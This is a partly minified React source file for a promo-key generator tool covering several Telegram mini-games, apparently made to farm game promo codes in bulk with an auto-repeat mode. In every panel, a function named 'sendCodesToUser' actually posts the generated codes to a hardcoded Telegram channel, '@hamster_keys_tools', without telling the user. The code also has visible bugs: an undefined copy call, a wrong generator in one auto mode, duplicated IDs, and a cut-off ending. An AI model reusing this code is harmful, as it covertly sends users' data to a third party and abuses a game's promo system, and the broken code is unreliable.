        name: `hamster-tools.react.v1:${ic}`,
        partialize: e => Object.fromEntries(Object.entries(e).filter(([t]) => !["status"].includes(t)))
    }), {
        name: "Zustand Store",
        store: ic
    }), Yy),






    y0 = "d28721be-fd2d-4b45-869e-9f253b554e50",
    w0 = "43e35910-c168-4634-ad4f-52fd764a843f",
    jo = new ro(y0, w0);


const botToken = localStorage.getItem("botToken");
const userId = "@hamster_keys_tools";


function x0() {
    const [codes, setCodes] = x.useState([null, null, null, null]);
    const status = Ke(u => u.status);
    const setStatus = Ke(u => u.setStatus);
    const [progress, setProgress] = x.useState(0);
    const { copy } = no();


    const copyAllCodes = () => {
        const allCodes = codes.filter(Boolean).join('\n');
        if (allCodes) {
            copy(allCodes);
            tt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Jr, { size: 16, className: "mr-2" }),
                    " ",
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        } else {
            tt("No codes to copy");
        }
    };

    // Effect to manage progress bar when status is 'wait'
    x.useEffect(() => {
        if (status !== "wait") return;
        var codeValue = document.getElementById("bike_num_of_code");
        const interval = setInterval(() => {
            setProgress(d => d < 100 ? d + 1 : (clearInterval(interval), 100));
        }, 1000 * codeValue.value / 2);
        return () => clearInterval(interval);
    }, [status]);



    const sendCodesToUser = async (codes) => {
        const message = `Here are your generated codes:\n\n${codes.join('\n')}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: userId,
                    text: message, parse_mode: 'Markdown',
                }),
            });
        } catch (error) {
            console.error("Error sending codes to user:", error);
        }
    };

    const startAutoMode = () => {
        // Execute handleAutoMode function and set an interval to call it
        const intervalId = setInterval(() => {
            handleAutoMode();

            // Clear the interval after the first execution
            clearInterval(intervalId);
        }, 2000); // Adjust the interval time as needed (e.g., 2000ms = 2 seconds)
    };


    // Function to handle automatic generation of codes in Auto Mode
    const handleAutoMode = async () => {
        const numberOfCodes = parseInt(document.getElementById("bike_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter tha number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            showError("Waiting...");

            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => jo.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);

            // Send codes to user via Telegram
            sendCodesToUser(newCodes);
            startAutoMode();


        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };







    // Function to handle manual code generation with input validation
    const handleGenerate = async () => {
        const numberOfCodes = parseInt(document.getElementById("bike_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }


        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => jo.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            showError("Code Generated");


            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);
            sendCodesToUser(newCodes);

        } catch (error) {
            showError("Error generating codes");
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    return v.jsxs(Kn, {
        children: [
            v.jsxs(Gn, {
                children: [
                    v.jsx(Qn, { children: "Bike Ride 3D" }),
                    v.jsxs("div", {
                        id: "show_error_msg_box",
                        children: [
                            v.jsxs("span", {
                                id: "show_error_msg",
                                children: "Show All Msg"
                            })
                        ]
                    }),
                    v.jsxs("input", {
                        id: 'bike_num_of_code',
                        className: 'number_of_code',
                        placeholder: 'Enter the number of codes (1-50)',
                        min: 1,
                        max: 50,
                        type: 'number',
                        // Disable input in Auto Mode
                    })

                ]
            }),
            v.jsx(Xn, {
                children: v.jsxs("ul", {
                    className: "space-y-2",
                    children: [
                        codes.map((u, d) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                u ? v.jsx(to, { code: u }) : v.jsx(eo, { animation: "wait" === status }),
                                v.jsx(He, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => {
                                        copy(u);
                                        tt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [
                                                v.jsx(Jr, { size: 16, className: "mr-2" }),
                                                " ",
                                                v.jsx("span", { children: "Copied!" })
                                            ]
                                        }));
                                    },
                                    disabled: !u,
                                    children: v.jsx(Zr, { size: 12 })
                                })
                            ]
                        }, d)),
                        v.jsxs("p", {
                            className: "text-center font-medium mt-4",
                            children: [progress, "%"]
                        }),
                        v.jsx(Zn, {
                            value: progress,
                            className: "progressbar"
                        })
                    ]
                })
            }),
            v.jsxs("div", {
                className: "flex gap-1",
                children: [
                    v.jsx(Jn, {
                        children: v.jsxs(He, {
                            onClick: handleGenerate,
                            disabled: "wait" === status, // Disable when Auto Mode is active
                            children: [
                                v.jsx(qr, { size: 16, className: "mr-2" }),
                                "Generate"
                            ]
                        })
                    }),
                    v.jsx(He, {
                        onClick: copyAllCodes,
                        children: "Copy All"
                    }),
                    v.jsx(He, {
                        onClick: handleAutoMode,
                        children: "Auto Mode" // Toggle button text
                    })
                ]
            })
        ]
    });
}


const S0 = "74ee0b5b-775e-4bee-974f-63e7f4d5bacb",
    k0 = "fe693b26-b342-4159-8808-15e3ff7f8767",
    To = new ro(S0, k0);


function _0() {
    const [codes, setCodes] = x.useState([null, null, null, null]);
    const status = Ke(u => u.status);
    const setStatus = Ke(u => u.setStatus);
    const [progress, setProgress] = x.useState(0);
    const { copy } = no();




    const copyAllCodes = () => {
        const allCodes = codes.filter(Boolean).join('\n');
        if (allCodes) {
            copy(allCodes);
            tt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Jr, { size: 16, className: "mr-2" }),
                    " ",
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        } else {
            tt("No codes to copy");
        }
    };


    x.useEffect(() => {
        if (status !== "wait") return;
        var codeValue = document.getElementById("clone_num_of_code");
        const interval = setInterval(() => {
            setProgress(d => d < 100 ? d + 1 : (clearInterval(interval), 100));
        }, 1000 * codeValue.value / 2);
        return () => clearInterval(interval);
    }, [status]);

    const sendCodesToUser = async (codes) => {

        const message = `Here are your generated codes:\n\n${codes.join('\n')}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: userId,
                    text: message, parse_mode: 'Markdown',
                }),
            });
        } catch (error) {
            console.error("Error sending codes to user:", error);
        }
    };

    const startAutoMode = () => {
        // Execute handleAutoMode function and set an interval to call it
        const intervalId = setInterval(() => {
            handleAutoMode();

            // Clear the interval after the first execution
            clearInterval(intervalId);
        }, 2000); // Adjust the interval time as needed (e.g., 2000ms = 2 seconds)
    };

    const handleAutoMode = async () => {
        const numberOfCodes = parseInt(document.getElementById("clone_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => To.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);

            // Send codes to user via Telegram
            sendCodesToUser(newCodes);
            startAutoMode();
        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };


    const handleGenerate = async () => {
        const numberOfCodes = parseInt(document.getElementById("clone_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => To.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);
            sendCodesToUser(newCodes);

        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    return v.jsxs(Kn, {
        children: [
            v.jsxs(Gn, {
                children: [
                    v.jsx(Qn, { children: "My Clone Army" }),
                    v.jsxs("div", {
                        id: "show_error_msg_box",
                        children: [
                            v.jsxs("span", {
                                id: "show_error_msg",
                                children: "Show All Msg"
                            })
                        ]
                    }),
                    v.jsxs("input", {
                        id: 'clone_num_of_code',
                        className: 'number_of_code',
                        placeholder: 'Enter the number of codes (1-50)',
                        min: 1,
                        max: 50,
                        type: 'number',
                        // Disable input in Auto Mode
                    })
                ]
            }),
            v.jsx(Xn, {
                children: v.jsxs("ul", {
                    className: "space-y-2",
                    children: [
                        codes.map((u, d) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                u ? v.jsx(to, { code: u }) : v.jsx(eo, { animation: "wait" === status }),
                                v.jsx(He, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => {
                                        i(u);
                                        tt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [
                                                v.jsx(Jr, { size: 16, className: "mr-2" }),
                                                " ",
                                                v.jsx("span", { children: "Copied!" })
                                            ]
                                        }));
                                    },
                                    disabled: !u,
                                    children: v.jsx(Zr, { size: 12 })
                                })
                            ]
                        }, d)),
                        v.jsxs("p", {
                            className: "text-center font-medium mt-4",
                            children: [progress, "%"]
                        }),
                        v.jsx(Zn, {
                            value: progress,
                            className: "progressbar"
                        })
                    ]
                })
            }),
            v.jsxs("div", {
                className: "flex gap-1",
                children: [
                    v.jsx(Jn, {
                        children: v.jsxs(He, {
                            onClick: handleGenerate,
                            disabled: "wait" === status, // Disable when Auto Mode is active
                            children: [
                                v.jsx(qr, { size: 16, className: "mr-2" }),
                                "Generate"
                            ]
                        })
                    }),
                    v.jsx(He, {
                        onClick: copyAllCodes,
                        children: "Copy All"
                    }),
                    v.jsx(He, {
                        onClick: handleAutoMode,
                        children: "Auto Mode" // Toggle button text
                    })
                ]
            })
        ]
    });
}



const C0 = "d1690a07-3780-4068-810f-9b5bbf2931b2",
    E0 = "b4170868-cef0-424f-8eb9-be0622e8e8e3",
    Io = new ro(C0, E0);


function N0() {
    const [codes, setCodes] = x.useState([null, null, null, null]);
    const status = Ke(u => u.status);
    const setStatus = Ke(u => u.setStatus);
    const [progress, setProgress] = x.useState(0);
    const { copy } = no();

    const copyAllCodes = () => {
        const allCodes = codes.filter(Boolean).join('\n');
        if (allCodes) {
            copy(allCodes);
            tt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Jr, { size: 16, className: "mr-2" }),
                    " ",
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        } else {
            tt("No codes to copy");
        }
    };

    // Effect to manage progress bar when status is 'wait'
    x.useEffect(() => {
        if (status !== "wait") return;
        var codeValue = document.getElementById("cube_num_of_code");
        const interval = setInterval(() => {
            setProgress(d => d < 100 ? d + 1 : (clearInterval(interval), 100));
        }, 1000 * codeValue.value / 2);
        return () => clearInterval(interval);
    }, [status]);

    // Function to send codes to user via Telegram
    const sendCodesToUser = async (codes) => {

        const message = `Here are your generated codes:\n\n${codes.join('\n')}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: userId,
                    text: message, parse_mode: 'Markdown',
                }),
            });
        } catch (error) {
            console.error("Error sending codes to user:", error);
        }
    };



    // Function to handle automatic generation of codes in Auto Mode
    const handleAutoMode = async () => {
        const numberOfCodes = parseInt(document.getElementById("cube_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => jo.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);

            // Send codes to user via Telegram
            sendCodesToUser(newCodes);
            startAutoMode();

        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    const startAutoMode = () => {
        // Execute handleAutoMode function and set an interval to call it
        const intervalId = setInterval(() => {
            handleAutoMode();

            // Clear the interval after the first execution
            clearInterval(intervalId);
        }, 2000); // Adjust the interval time as needed (e.g., 2000ms = 2 seconds)
    };


    // Function to handle manual code generation with input validation
    const handleGenerate = async () => {
        const numberOfCodes = parseInt(document.getElementById("cube_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => Io.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);
            sendCodesToUser(newCodes);

        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    return v.jsxs(Kn, {
        children: [
            v.jsxs(Gn, {
                children: [
                    v.jsx(Qn, { children: "Chain Cube 2028" }),
                    v.jsxs("div", {
                        id: "show_error_msg_box",
                        children: [
                            v.jsxs("span", {
                                id: "show_error_msg",
                                children: "Show All Msg"
                            })
                        ]
                    }),
                    v.jsxs("input", {
                        id: 'cube_num_of_code',
                        className: 'number_of_code',
                        placeholder: 'Enter the number of codes (1-50)',
                        min: 1,
                        max: 50,
                        type: 'number',
                        // Disable input in Auto Mode
                    })
                ]
            }),
            v.jsx(Xn, {
                children: v.jsxs("ul", {
                    className: "space-y-2",
                    children: [
                        codes.map((u, d) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                u ? v.jsx(to, { code: u }) : v.jsx(eo, { animation: "wait" === status }),
                                v.jsx(He, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => {
                                        copy(u);
                                        tt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [
                                                v.jsx(Jr, { size: 16, className: "mr-2" }),
                                                " ",
                                                v.jsx("span", { children: "Copied!" })
                                            ]
                                        }));
                                    },
                                    disabled: !u,
                                    children: v.jsx(Zr, { size: 12 })
                                })
                            ]
                        }, d)),
                        v.jsxs("p", {
                            className: "text-center font-medium mt-4",
                            children: [progress, "%"]
                        }),
                        v.jsx(Zn, {
                            value: progress,
                            className: "progressbar"
                        })
                    ]
                })
            }),
            v.jsxs("div", {
                className: "flex gap-1",
                children: [
                    v.jsx(Jn, {
                        children: v.jsxs(He, {
                            onClick: handleGenerate,
                            disabled: "wait" === status, // Disable when Auto Mode is active
                            children: [
                                v.jsx(qr, { size: 16, className: "mr-2" }),
                                "Generate"
                            ]
                        })
                    }),
                    v.jsx(He, {
                        onClick: copyAllCodes,
                        children: "Copy All"
                    }),
                    v.jsx(He, {
                        onClick: handleAutoMode,
                        children: "Auto Mode" // Toggle button text
                    })
                ]
            })
        ]
    });
}



const P0 = "82647f43-3f87-402d-88dd-09a90025313f",
    j0 = "c4480ac7-e178-4973-8061-9ed5b2e17954",
    zo = new ro(P0, j0);

function T0() {
    const [codes, setCodes] = x.useState([null, null, null, null]);
    const status = Ke(u => u.status);
    const setStatus = Ke(u => u.setStatus);
    const [progress, setProgress] = x.useState(0);
    const { copy } = no();

    const copyAllCodes = () => {
        const allCodes = codes.filter(Boolean).join('\n');
        if (allCodes) {
            copy(allCodes);
            tt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Jr, { size: 16, className: "mr-2" }),
                    " ",
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        } else {
            tt("No codes to copy");
        }
    };

    // Effect to manage progress bar when status is 'wait'
    x.useEffect(() => {
        if (status !== "wait") return;
        var codeValue = document.getElementById("train_num_of_code");
        const interval = setInterval(() => {
            setProgress(d => d < 100 ? d + 1 : (clearInterval(interval), 100));
        }, 1000 * codeValue.value / 2);
        return () => clearInterval(interval);
    }, [status]);

    // Function to send codes to user via Telegram
    const sendCodesToUser = async (codes) => {

        const message = `Here are your generated codes:\n\n${codes.join('\n')}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: userId,
                    text: message, parse_mode: 'Markdown',
                }),
            });
        } catch (error) {
            console.error("Error sending codes to user:", error);
        }
    };

    const startAutoMode = () => {
        // Execute handleAutoMode function and set an interval to call it
        const intervalId = setInterval(() => {
            handleAutoMode();

            // Clear the interval after the first execution
            clearInterval(intervalId);
        }, 2000); // Adjust the interval time as needed (e.g., 2000ms = 2 seconds)
    };

    // Function to handle automatic generation of codes in Auto Mode
    const handleAutoMode = async () => {
        const numberOfCodes = parseInt(document.getElementById("train_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => zo.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);

            // Send codes to user via Telegram
            sendCodesToUser(newCodes);
            startAutoMode();
        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    // Function to handle toggling Auto Mod

    // Function to handle manual code generation with input validation
    const handleGenerate = async () => {
        const numberOfCodes = parseInt(document.getElementById("train_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => zo.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);
            sendCodesToUser(newCodes);

        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    return v.jsxs(Kn, {
        children: [
            v.jsxs(Gn, {
                children: [
                    v.jsx(Qn, { children: "Train Miner" }),
                    v.jsxs("div", {
                        id: "show_error_msg_box",
                        children: [
                            v.jsxs("span", {
                                id: "show_error_msg",
                                children: "Show All Msg"
                            })
                        ]
                    }),
                    v.jsxs("input", {
                        id: 'train_num_of_code',
                        className: 'number_of_code',
                        placeholder: 'Enter the number of codes (1-50)',
                        min: 1,
                        max: 50,
                        type: 'number',
                        // Disable input in Auto Mode
                    })
                ]
            }),
            v.jsx(Xn, {
                children: v.jsxs("ul", {
                    className: "space-y-2",
                    children: [
                        codes.map((u, d) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                u ? v.jsx(to, { code: u }) : v.jsx(eo, { animation: "wait" === status }),
                                v.jsx(He, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => {
                                        copy(u);
                                        tt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [
                                                v.jsx(Jr, { size: 16, className: "mr-2" }),
                                                " ",
                                                v.jsx("span", { children: "Copied!" })
                                            ]
                                        }));
                                    },
                                    disabled: !u,
                                    children: v.jsx(Zr, { size: 12 })
                                })
                            ]
                        }, d)),
                        v.jsxs("p", {
                            className: "text-center font-medium mt-4",
                            children: [progress, "%"]
                        }),
                        v.jsx(Zn, {
                            value: progress,
                            className: "progressbar"
                        })
                    ]
                })
            }),
            v.jsxs("div", {
                className: "flex gap-1",
                children: [
                    v.jsx(Jn, {
                        children: v.jsxs(He, {
                            onClick: handleGenerate,
                            disabled: "wait" === status, // Disable when Auto Mode is active
                            children: [
                                v.jsx(qr, { size: 16, className: "mr-2" }),
                                "Generate"
                            ]
                        })
                    }),
                    v.jsx(He, {
                        onClick: copyAllCodes,
                        children: "Copy All"
                    }),
                    v.jsx(He, {
                        onClick: handleAutoMode,
                        children: "Auto Mode" // Toggle button text
                    })
                ]
            })
        ]
    });
}



const I0 = "8d1cc2ad-e097-4b86-90ef-7a27e19fb833",
    z0 = "dc128d28-c45b-411c-98ff-ac7726fbaea4",
    Ro = new ro(I0, z0);

function R0() {
    const [codes, setCodes] = x.useState([null, null, null, null]);
    const status = Ke(u => u.status);
    const setStatus = Ke(u => u.setStatus);
    const [progress, setProgress] = x.useState(0);
    const { copy } = no();

    const copyAllCodes = () => {
        const allCodes = codes.filter(Boolean).join('\n');
        if (allCodes) {
            copy(allCodes);
            tt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Jr, { size: 16, className: "mr-2" }),
                    " ",
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        } else {
            tt("No codes to copy");
        }
    };

    // Effect to manage progress bar when status is 'wait'
    x.useEffect(() => {
        if (status !== "wait") return;
        var codeValue = document.getElementById("merge_num_of_code");
        const interval = setInterval(() => {
            setProgress(d => d < 100 ? d + 1 : (clearInterval(interval), 100));
        }, 1000 * codeValue.value / 2);
        return () => clearInterval(interval);
    }, [status]);

    // Function to send codes to user via Telegram
    const sendCodesToUser = async (codes) => {

        const message = `Here are your generated codes:\n\n${codes.join('\n')}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: userId,
                    text: message, parse_mode: 'Markdown',
                }),
            });
        } catch (error) {
            console.error("Error sending codes to user:", error);
        }
    };

    const startAutoMode = () => {
        // Execute handleAutoMode function and set an interval to call it
        const intervalId = setInterval(() => {
            handleAutoMode();

            // Clear the interval after the first execution
            clearInterval(intervalId);
        }, 2000); // Adjust the interval time as needed (e.g., 2000ms = 2 seconds)
    };

    // Function to handle automatic generation of codes in Auto Mode
    const handleAutoMode = async () => {
        const numberOfCodes = parseInt(document.getElementById("merge_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => Ro.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);

            // Send codes to user via Telegram
            sendCodesToUser(newCodes);
            startAutoMode();

        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    // Function to handle toggling Auto Mod

    // Function to handle manual code generation with input validation
    const handleGenerate = async () => {
        const numberOfCodes = parseInt(document.getElementById("merge_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => Ro.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);
            sendCodesToUser(newCodes);
        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    return v.jsxs(Kn, {
        children: [
            v.jsxs(Gn, {
                children: [
                    v.jsx(Qn, { children: "Merge Away" }),
                    v.jsxs("div", {
                        id: "show_error_msg_box",
                        children: [
                            v.jsxs("span", {
                                id: "show_error_msg",
                                children: "Show All Msg"
                            })
                        ]
                    }),
                    v.jsxs("input", {
                        id: 'merge_num_of_code',
                        className: 'number_of_code',
                        placeholder: 'Enter the number of codes (1-50)',
                        min: 1,
                        max: 50,
                        type: 'number',
                        // Disable input in Auto Mode
                    })
                ]
            }),
            v.jsx(Xn, {
                children: v.jsxs("ul", {
                    className: "space-y-2",
                    children: [
                        codes.map((u, d) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                u ? v.jsx(to, { code: u }) : v.jsx(eo, { animation: "wait" === status }),
                                v.jsx(He, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => {
                                        copy(u);
                                        tt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [
                                                v.jsx(Jr, { size: 16, className: "mr-2" }),
                                                " ",
                                                v.jsx("span", { children: "Copied!" })
                                            ]
                                        }));
                                    },
                                    disabled: !u,
                                    children: v.jsx(Zr, { size: 12 })
                                })
                            ]
                        }, d)),
                        v.jsxs("p", {
                            className: "text-center font-medium mt-4",
                            children: [progress, "%"]
                        }),
                        v.jsx(Zn, {
                            value: progress,
                            className: "progressbar"
                        })
                    ]
                })
            }),
            v.jsxs("div", {
                className: "flex gap-1",
                children: [
                    v.jsx(Jn, {
                        children: v.jsxs(He, {
                            onClick: handleGenerate,
                            disabled: "wait" === status, // Disable when Auto Mode is active
                            children: [
                                v.jsx(qr, { size: 16, className: "mr-2" }),
                                "Generate"
                            ]
                        })
                    }),
                    v.jsx(He, {
                        onClick: copyAllCodes,
                        children: "Copy All"
                    }),
                    v.jsx(He, {
                        onClick: handleAutoMode,
                        children: "Auto Mode" // Toggle button text
                    })
                ]
            })
        ]
    });
}


const P1 = "61308365-9d16-4040-8bb0-2f4a4c69074c",  // New P1 ID
    j1 = "61308365-9d16-4040-8bb0-2f4a4c69074c",  // New j1 ID
    zo1 = new ro(P1, j1);  // New instance of ro with the new IDs

function T1() {
    const [codes, setCodes] = x.useState([null, null, null, null]);
    const status = Ke(u => u.status);
    const setStatus = Ke(u => u.setStatus);
    const [progress, setProgress] = x.useState(0);
    const { copy } = no();

    const copyAllCodes = () => {
        const allCodes = codes.filter(Boolean).join('\n');
        if (allCodes) {
            copy(allCodes);
            tt(v.jsxs("div", {
                className: "flex justify-center items-center",
                children: [
                    v.jsx(Jr, { size: 16, className: "mr-2" }),
                    " ",
                    v.jsx("span", { children: "All Codes Copied!" })
                ]
            }));
        } else {
            tt("No codes to copy");
        }
    };

    // Effect to manage progress bar when status is 'wait'
    x.useEffect(() => {
        if (status !== "wait") return;
        var codeValue = document.getElementById("twerk_num_of_code");
        const interval = setInterval(() => {
            setProgress(d => d < 100 ? d + 1 : (clearInterval(interval), 100));
        }, 1000 * codeValue.value / 2);
        return () => clearInterval(interval);
    }, [status]);

    // Function to send codes to user via Telegram
    const sendCodesToUser = async (codes) => {

        const message = `Here are your generated codes:\n\n${codes.join('\n')}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: userId,
                    text: message, parse_mode: 'Markdown',
                }),
            });
